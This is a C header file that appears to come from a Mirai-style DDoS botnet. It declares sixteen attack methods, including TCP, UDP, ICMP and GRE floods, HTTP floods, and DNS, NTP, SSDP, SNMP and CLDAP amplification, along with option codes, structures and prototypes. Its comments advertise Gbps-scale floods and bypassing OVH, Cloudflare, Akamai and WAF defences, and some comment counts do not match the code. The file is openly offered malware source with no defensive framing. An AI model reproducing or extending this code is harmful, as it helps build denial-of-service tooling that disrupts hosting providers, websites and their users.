#ifndef _ATTACK_H
#define _ATTACK_H

#include "includes.h"

/* ============================================================================
 * ATTACK VECTORS - 16 Optimized DDoS Methods
 * ============================================================================
 * Layer 4 (9 methods): TCP, UDP, OVH bypass, ICMP, GRE, Combined
 * Layer 7 (3 methods): HTTP, AXIS-L7, ULTIMATE-L7
 * Amplification (4 methods): DNS, NTP, SSDP, SNMP, CLDAP
 * 
 * Performance: Gbps-scale volumetric attacks
 * Bypass: OVH Game, Cloudflare, Akamai, WAF evasion
 * ============================================================================ */
#define ATK_VEC_TCP         0   /* TCP flood optimized for Gbps */
#define ATK_VEC_UDP         1   /* UDP flood optimized for Gbps */
#define ATK_VEC_HTTP        2   /* HTTP flood optimized for RPS */
#define ATK_VEC_OVHTCP      3   /* TCP with OVH bypass */
#define ATK_VEC_OVHUDP      4   /* UDP with OVH bypass */
#define ATK_VEC_ICMP        5   /* ICMP ping flood */
#define ATK_VEC_GREIP       6   /* GRE IP flood */
#define ATK_VEC_GREETH      7   /* GRE Ethernet flood */
#define ATK_VEC_AXISL7      8   /* AXIS-L7 - Advanced multi-layer bypass */
#define ATK_VEC_AXIS_TCP    9   /* AXIS-TCP - All TCP methods + ICMP + GRE */
#define ATK_VEC_AXIS_UDP    10  /* AXIS-UDP - All UDP methods + ICMP + GRE */
#define ATK_VEC_DNS_AMP     11  /* DNS Amplification (50x-100x) */
#define ATK_VEC_NTP_AMP     12  /* NTP Amplification (100x-500x) */
#define ATK_VEC_SSDP_AMP    13  /* SSDP Amplification (30x-50x) */
#define ATK_VEC_SNMP_AMP    14  /* SNMP Amplification (50x-100x) */
#define ATK_VEC_CLDAP_AMP   15  /* CLDAP Amplification (50x-70x) */

#define ATK_VEC_MAX         16

/* ============================================================================
 * ATTACK OPTIONS
 * ============================================================================ */
#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_HTTP_METHOD     9
#define ATK_OPT_HTTP_POST_DATA  10
#define ATK_OPT_HTTP_PATH       11
#define ATK_OPT_CONNS           12
#define ATK_OPT_SOURCE          13
#define ATK_OPT_URL             14
#define ATK_OPT_HTTPS           15
#define ATK_OPT_USERAGENT       16
#define ATK_OPT_COOKIES         17
#define ATK_OPT_REFERER         18
#define ATK_OPT_DPORT_TCP       19  /* TCP port for AXIS-TCP */
#define ATK_OPT_DPORT_UDP       20  /* UDP port for AXIS-UDP */
#define ATK_OPT_DPORT_GRE       21  /* GRE port for AXIS-TCP/AXIS-UDP */

/* ============================================================================
 * ATTACK STRUCTURES
 * ============================================================================ */
struct attack_target {
    struct in_addr addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_method {
    void (*func)(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
    uint8_t type;
};

/* ============================================================================
 * FUNCTION PROTOTYPES
 * ============================================================================ */
void attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, uint8_t, int, struct attack_target *, struct attack_option *);
char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
uint32_t attack_get_opt_ip(int, struct attack_option *, int, uint8_t);

/* Attack method declarations */
void attack_tcp_gbps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_udp_gbps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_http_rps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ovh_tcp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ovh_udp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_icmp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_gre_ip(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_gre_eth(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_axis_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_axis_tcp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_axis_udp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_dns_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ntp_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_ssdp_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_snmp_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
void attack_cldap_amp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

#endif
